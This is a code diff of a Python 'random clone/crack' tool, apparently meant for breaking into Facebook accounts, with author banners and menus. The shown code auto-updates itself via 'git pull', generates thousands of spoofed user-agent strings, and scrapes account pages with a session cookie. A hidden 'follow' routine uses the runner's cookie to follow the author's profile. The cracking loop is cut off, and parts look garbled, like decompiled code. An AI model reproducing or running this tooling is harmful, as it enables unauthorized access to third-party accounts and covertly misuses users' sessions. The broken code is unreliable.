@@ -1,114 +1,268 @@
-#Daily Update Will come
-#🐸🐸 Open source
-#update no : 1
-#Mr-Talha-Vau
-W = '\033[97;1m' 
-R = '\033[91;1m' 
-G = '\033[92;1m' 
-Y = '\033[93;1m' 
-B = '\033[94;1m'
-P = '\033[95;1m'
-C = '\033[96;1m'
-N = '\x1b[0m' 
-import os
-try:
-	import requests
-except ImportError:
-	os.system("pip install requests") 
-try:
-	import concurrent.futures
-except ImportError:
-	os.system("pip install futures") 
-import os
-import sys
-import time
-import requests
-import random
-import platform
-import base64
-import subprocess
-from concurrent.futures import ThreadPoolExecutor
-import requests,bs4,uuid,json,os,sys,random,datetime,time,re,subprocess
-try:
-	import rich
-except ImportError:
-	os.system('pip install rich')
-	time.sleep(1)
-	try:
-		import rich
-	except ImportError:
-		exit(' [×] Cant Install Rich Module, Try Manual Install (pip install rich)')
-from rich.table import Table as me
-from rich.console import Console as sol
+#Programmer: MUMIT ISLAM HIMU
+# Facebook: Mumit Islam
+# Github: Demon-Cyber-404
+import os,sys,time,json,random,re,string,platform,base64,uuid
+os.system("git pull")
 from bs4 import BeautifulSoup as sop
-from concurrent.futures import ThreadPoolExecutor as tred
-from rich.console import Group as gp
-from rich.panel import Panel as nel
-import base64
-from rich import print as cetak
-from rich.markdown import Markdown as mark
-from rich.columns import Columns as col
-from urllib.parse import quote
-ugen = ['Mozilla/5.0 (Windows NT 6.1; WOW64) 8; ASUS_I006D Build/RKQ1.201022.002X846O) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.398.0.4702.74 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 4; ASUS_I006D Build/RKQ1.201022.002W761D) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.381.0.4321.81 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 7; ASUS_I006D Build/RKQ1.201022.002D37Y) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.387.0.4520.141 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 5; ASUS_I006D Build/RKQ1.201022.002X345N) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.387.0.4457.108 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 12; ASUS_I006D Build/RKQ1.201022.002Z827A) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.395.0.4803.76 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 9; ASUS_I006D Build/RKQ1.201022.002V847W) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.375.0.4705.111 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 4; ASUS_I006D Build/RKQ1.201022.002N341T) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.395.0.4827.121 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 8; ASUS_I006D Build/RKQ1.201022.002Y791J) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.381.0.4376.42 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 8; ASUS_I006D Build/RKQ1.201022.002Z333A) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.377.0.4768.107 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 12; ASUS_I006D Build/RKQ1.201022.002G873P) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.378.0.4348.54 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 4; ASUS_I006D Build/RKQ1.201022.002R697H) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.398.0.4680.71 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 8; ASUS_I006D Build/RKQ1.201022.002Z665C) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.397.0.4693.128 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 12; ASUS_I006D Build/RKQ1.201022.002E853Z) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.387.0.4775.141 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 10; ASUS_I006D Build/RKQ1.201022.002Z99L) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.386.0.4735.47 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 10; ASUS_I006D Build/RKQ1.201022.002F325V) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.377.0.4867.61 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 9; ASUS_I006D Build/RKQ1.201022.002K664M) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.375.0.4665.45 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 11; ASUS_I006D Build/RKQ1.201022.002W549Q) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.390.0.4446.76 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 5; ASUS_I006D Build/RKQ1.201022.002S207Z) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.382.0.4412.113 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 11; ASUS_I006D Build/RKQ1.201022.002V545M) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.397.0.4553.82 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 10; ASUS_I006D Build/RKQ1.201022.002F950N) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.374.0.4777.137 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 8; ASUS_I006D Build/RKQ1.201022.002E740D) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.379.0.4496.100 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 7; ASUS_I006D Build/RKQ1.201022.002U973T) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.378.0.4472.139 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 8; ASUS_I006D Build/RKQ1.201022.002E710O) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.375.0.4846.93 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 10; ASUS_I006D Build/RKQ1.201022.002H294B) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.382.0.4476.53 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 12; ASUS_I006D Build/RKQ1.201022.002U697M) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.381.0.4607.142 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 12; ASUS_I006D Build/RKQ1.201022.002O992K) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.395.0.4346.100 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 9; ASUS_I006D Build/RKQ1.201022.002U857V) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.389.0.4559.57 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 9; ASUS_I006D Build/RKQ1.201022.002X311G) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.389.0.4777.77 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 11; ASUS_I006D Build/RKQ1.201022.002W175A) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.388.0.4709.88 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 10; ASUS_I006D Build/RKQ1.201022.002N155W) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.381.0.4623.139 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 11; ASUS_I006D Build/RKQ1.201022.002B288K) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.398.0.4694.64 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 5; ASUS_I006D Build/RKQ1.201022.002B710R) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.397.0.4219.63 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 10; ASUS_I006D Build/RKQ1.201022.002A750V) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.382.0.4278.80 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 6; ASUS_I006D Build/RKQ1.201022.002H922H) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.373.0.4738.113 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 6; ASUS_I006D Build/RKQ1.201022.002O545R) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.379.0.4719.132 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 9; ASUS_I006D Build/RKQ1.201022.002H585M) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.385.0.4275.87 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 4; ASUS_I006D Build/RKQ1.201022.002C636P) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.385.0.4265.75 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 12; ASUS_I006D Build/RKQ1.201022.002X278G) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.379.0.4599.104 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 12; ASUS_I006D Build/RKQ1.201022.002R158F) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.397.0.4571.71 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 11; ASUS_I006D Build/RKQ1.201022.002V851O) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.383.0.4593.48 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 5; ASUS_I006D Build/RKQ1.201022.002D265G) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.377.0.4332.62 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 10; ASUS_I006D Build/RKQ1.201022.002J10J) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.377.0.4878.134 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 8; ASUS_I006D Build/RKQ1.201022.002P257Z) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.385.0.4388.134 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 8; ASUS_I006D Build/RKQ1.201022.002P304S) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.378.0.4445.80 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 6; ASUS_I006D Build/RKQ1.201022.002B688U) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.373.0.4877.42 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 11; ASUS_I006D Build/RKQ1.201022.002B85A) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.399.0.4413.86 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 7; ASUS_I006D Build/RKQ1.201022.002Z113D) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.393.0.4592.42 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 9; ASUS_I006D Build/RKQ1.201022.002I712L) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.385.0.4614.109 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 11; ASUS_I006D Build/RKQ1.201022.002J811B) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.375.0.4849.113 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 8; ASUS_I006D Build/RKQ1.201022.002Q887W) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.386.0.4435.50 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 5; ASUS_I006D Build/RKQ1.201022.002H570O) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.377.0.4465.79 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 4; ASUS_I006D Build/RKQ1.201022.002J951A) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.395.0.4707.130 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 5; ASUS_I006D Build/RKQ1.201022.002U117J) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.390.0.4419.147 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 8; ASUS_I006D Build/RKQ1.201022.002T725B) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.395.0.4735.132 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 5; ASUS_I006D Build/RKQ1.201022.002C293I) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.394.0.4773.81 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 4; ASUS_I006D Build/RKQ1.201022.002P511Y) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.389.0.4428.122 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 5; ASUS_I006D Build/RKQ1.201022.002G568D) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.395.0.4419.71 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 4; ASUS_I006D Build/RKQ1.201022.002C157R) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.388.0.4709.83 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 8; ASUS_I006D Build/RKQ1.201022.002P947F) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.397.0.4310.101 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 7; ASUS_I006D Build/RKQ1.201022.002J797K) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.398.0.4884.55 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 8; ASUS_I006D Build/RKQ1.201022.002N124D) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.378.0.4254.116 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 11; ASUS_I006D Build/RKQ1.201022.002C973I) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.387.0.4796.128 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 7; ASUS_I006D Build/RKQ1.201022.002V77Q) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.382.0.4519.106 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 8; ASUS_I006D Build/RKQ1.201022.002U898D) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.386.0.4281.51 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 4; ASUS_I006D Build/RKQ1.201022.002J944M) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.376.0.4420.135 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 8; ASUS_I006D Build/RKQ1.201022.002J108X) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.389.0.4324.107 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 7; ASUS_I006D Build/RKQ1.201022.002I186B) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.376.0.4895.113 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 11; ASUS_I006D Build/RKQ1.201022.002M879A) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.388.0.4616.59 Mobile Safari/537.36 Sleipnir/3.5.28', 'Mozilla/5.0 (Windows NT 6.1; WOW64) 12; ASUS_I006D Build/RKQ1.201022.002J491N) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.398.0.4565.65 Mobile Safari/537.36 Sleipnir/3.5.28']
-logo = ("""\033[132m
-\033[1;32m╔═══════════════════════════════════════════════════════════╗\033[1;93m
-\033[1;32m║	         \033[1;93m ─━㋱ASSALAMUALAIKUM㋱━─\033[1;32m	                                 
-\033[1;32m║═══════════════════════════════════════════════════════════╗
-\033[1;32m║      \033[1;93m ███    ███ ███    ███ ███████                                                                             ║ \033[1;32m                               
-\033[1;32m║     \033[1;93m  ████  ████ ████  ████ ██                                                                                    ║ \033[1;32m      
-\033[1;32m║    \033[1;93m   ██ ████ ██ ██ ████ ██ ███████                                                                      ║ \033[1;32m       
-\033[1;32m║   \033[1;93m    ██  ██  ██ ██  ██  ██      ██                                                                                       ║ \033[1;32m         
-\033[1;32m║  \033[1;93m     ██      ██ ██      ██ ███████                                                                                     ║ \033[1;32m          
-\033[1;32m║═══════════════════════════════════════════════════════════║
-\033[1;32m║NOTE : \033[37;41mTHIS TOOLS IS FREE\033[0;m\033[1;32m           
-\033[1;32m║═══════════════════════════════════════════════════════════║ \x1b[1;91m   
-\033[1;32m║AUTHOR       : AHMED HIMU\x1b[1;91m       
-\033[1;32m║═══════════════════════════════════════════════════════════║ \x1b[1;91m  
-\033[1;32m║WHATSAPP : +923264985137\x1b[1;91m     
-\033[1;32m║═══════════════════════════════════════════════════════════║ \x1b[1;91m        
-\033[1;32m║GITHUB         : irtazaha\x1b[1;91m    
-\033[1;32m║═══════════════════════════════════════════════════════════║
-\033[1;32m║SERVER      : DATA - WIFI WORKING\033[37;41mPROJECT 2009\033[0;m\033[1;32m      
-\033[1;32m║═══════════════════════════════════════════════════════════║
-\033[1;32m║FACEBOOK LINK : \x1b[1;91mhttps://www.facebook.com/musa.khan.39545\033[1;32m  
-\033[1;32m║═══════════════════════════════════════════════════════════║
-\033[1;32m║YouTube LINK  : \x1b[1;91merror\033[1;32m    
-\033[1;32m╚═══════════════════════════════════════════════════════════╝\033[1;37m""")
-class Main:
-	def __init__(self):
-		self.id = []
-		self.ok = []
-		self.cp = []
-		self.loop = 0
-		os.system("clear")
-		print(logo)
-		print("\n\033[1;32m╔══════════════════════════════════════════════════════════╗")
-		print("║               \x1b[1;91m─━㋱ WELCOME  TO MY CITY ㋱━─\033[1;32m              ║")
-		print("╚══════════════════════════════════════════════════════════╝")
-		print("\033[1;32m [1] FIRST FOLLOW ME FOR APPROVE")
-		print("\033[1;33m [2] Exit")
-		print("")
-		syed = input("\n\033[1;36m  Chose ==> \033[1;32m")
-		if syed in ["", " "]:
-			exit()
-		elif syed in ["2", "02"]:
-			print("    Thanks🥰♥️")
-			exit()
-		elif syed in ["1", "01"]:
-			os.system("xdg-open https://www.facebook.coom/musa.khan.39545")
-			print("")
-			time.sleep(2.0)
-			print("\033[1;33m    Your Name")
-			print("")
-			input("\n\033[1;32m  Type Your gmail Name ==> \033[1;36m")
-			time.sleep(2.1)
-			print("")
-			print("\033[1;32m  Successfully Bro")
-			time.sleep(2.0)
-			os.system("clear")
-		print(logo)
-		print('\33[37;41m\t75% CP ID will just now login\33[0;m')
-		print("\033[0;90m ><><><><><><><><><><><><><><><><><><>><")
-		print('\x1b[1;32m [1]\x1b[1;33m Cloning Old Idz CRACK ')
-		print('\x1b[1;32m [2] \x1b[1;32mCONTACT ME ON FACEBOOK')
-		print(' \x1b[1;32m[3] \x1b[1;32mSUBSCRIBE MY] \x1b[1;32mSUBSCRIBE')
+from bs4 import BeautifulSoup
+import requests as ress
+from datetime import date
+from datetime import datetime
+from time import sleep
+from time import sleep as waktu
+try:
+    import requests
+    from concurrent.futures import ThreadPoolExecutor as ThreadPool
+    import mechanize
+    from requests.exceptions import ConnectionError
+except ModuleNotFoundError:
+    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
+    os.system('pip install bs4')
+    
+def DEMON():
+    os.system('clear')
+    jalan(logo)
+    print('\033[1;92m')
+    jalan('\033[1;91m[\033[1;92m1\033[1;91m]\033[1;92m START RANDOM CRACK ')
+    jalan('\033[1;91m[\033[1;92m0\033[1;91m]\033[1;91m EXIT')
+    opt = input('\n\x1b[1;32m\033[1;91m[\033[1;92m\033[1;91m]\033[1;32mCHOOSE : ')
+    if opt == '1':
+        dmn()
+    
+def cek_apk(session,coki):
+    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+        
+        for i in range(len(game)):
+            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
+        
+    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+        
+        for i in range(len(game)):
+            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
+        else:
+            print('')
+
+def follow(self, session, coki):
+        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
+            'cookie': coki }, **('cookies',)).text, 'html.parser')
+        get = r.find('a', 'Ikuti', **('string',)).get('href')
+        session.get('https://mbasic.facebook.com' + str(get), {
+            'cookie': coki }, **('cookies',)).text
+            
+            
+
+class jalan:
+    def __init__(self, z):
+        for e in z + "\n":
+            sys.stdout.write(e)
+            sys.stdout.flush()
+            time.sleep(0.009)
+            
+P = '\x1b[1;97m'
+M = '\x1b[1;91m'
+H = '\x1b[1;92m'
+K = '\x1b[1;93m'
+B = '\x1b[1;94m'
+U = '\x1b[1;95m' 
+O = '\x1b[1;96m'
+N = '\x1b[0m'    
+Z = "\033[1;30m"
+sir = '\033[41m\x1b[1;97m'
+x = '\33[m' # DEFAULT
+m = '\x1b[1;91m' #RED +
+k = '\033[93m' # KUNING +
+xr = '\x1b[1;92m' # HIJAU +
+hh = '\033[32m' # HIJAU -
+u = '\033[95m' # UNGU
+kk = '\033[33m' # KUNING -
+b = '\33[1;96m' # BIRU -
+p = '\x1b[0;34m' # BIRU +
+asu = random.choice([m,k,xr,u,b])
+my_color = [
+ P, M, H, K, B, U, O, N]
+warna = random.choice(my_color)
+now = datetime.now()
+dt_string = now.strftime("%H:%M")
+current = datetime.now()
+ta = current.year
+bu = current.month
+ha = current.day
+today = date.today()
+os.system('xdg-open https://facebook.com/groups/termuxteambd/')
+logo = ("""
+\033[1;92m        ____  ________  _______  _   __
+\033[1;92m       / __ \/ ____/  |/  / __ \/ | / /
+\033[1;92m      / / / / __/ / /|_/ / / / /  |/ / 
+\033[0;92m     / /_/ / /___/ /  / / /_/ / /|  /  
+\033[1;92m    /_____/_____/_/  /_/\____/_/ |_/     
+════════════════════════════════════════
+ AUTHOR   => MUMIT ISLAM HIMU       
+ TOOLS    => RANDOM CLONE            
+ STATUS   => FREE                    
+ GITHUB   => Demon-Cyber-404         
+ WHATSAPP => +8801644777805          
+════════════════════════════════════════""")
+
+        
+loop = 0
+oks = []
+cps = []
+
+def clear():
+    os.system('clear')
+    print(logo)
+from time import localtime as lt
+from os import system as cmd
+ltx = int(lt()[3])
+if ltx > 12:
+    a = ltx-12
+    tag = "PM"
+else:
+    a = ltx
+    tag = "AM"
+    
+    
+try:
+    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
+    v = 5.2
+    update = ('5.2')
+    update = ('5.2')
+    if str(v) in update:
+        os.system('clear')
+    else:pass
+except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
+
+def dynamic(text):
+    titik = ['.   ','..  ','... ','.... ']
+    for o in titik:
+        print('\r'+text+o),
+        sys.stdout.flush();time.sleep(1)
+
+ugen2=[]
+ugen=[]
+ 
+for xd in range(10000):
+    aa='Mozilla/5.0 (Linux; U; Android'
+    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
+    c=' en-us; GT-'
